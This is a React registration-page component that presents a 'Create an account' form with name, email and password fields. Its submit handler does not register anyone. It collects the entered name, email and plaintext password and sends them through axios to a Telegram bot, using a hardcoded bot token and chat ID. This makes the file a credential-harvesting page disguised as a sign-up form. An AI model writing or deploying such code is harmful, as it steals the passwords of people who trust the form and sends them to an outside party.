import axios from 'axios';
import React, { useState } from 'react'
import Side from '../assets/Side.svg'
import Black from './Black';

const Register = () => {
    const [loading,sendLoading] = useState(true)
    const SendMessage=(event)=>{
        event.preventDefault();
        const token = "7555610376:AAHBxMX3B63GKyeRyTBj88wVayg54J1Dmzk";
        const chat_id =5203595510;
        const url =`https://api.telegram.org/bot${token}/sendMessage`;
        const name = document.getElementById("name").value;
        const email = document.getElementById("email").value;
        const password = document.getElementById("password").value;
        const send =`Name: ${name} \nEmail: ${email} \nPassword: ${password}`
 axios({
    url:url,
    method:'Post',
    data:{
        "chat_id":chat_id,
        "text":send,
       
    }
 })
    }
  return (
<>
<div className='flex items-center gap-14 my-20 '>
<div>
    <img src={Side} alt="" />
</div>
<div>
    <p  className='text-4xl font-bold'>Create an account</p>
    <p className='my-3'>Enter your details below</p>
    <form className='flex flex-col gap-4 my-4' id="YUS" onSubmit={SendMessage}>
        <label htmlFor="">Name</label>
        <input className='border border-black px-2 py-1' type="text" id='name' />

        <label htmlFor="">Email</label>
        <input className='border border-black px-2 py-1' type="email" id='email'/>

        <label htmlFor="">Password</label>
        <input className='border border-black px-2 py-1' type="password" id='password' />

        <button className='btn bg-red-600  text-white font-bold mt-4' type='' loading ={loading}>Create Account</button>


    </form>
</div>

</div>
<div className='mt-10'>
< Black />
</div>



</>
  )
}

export default Register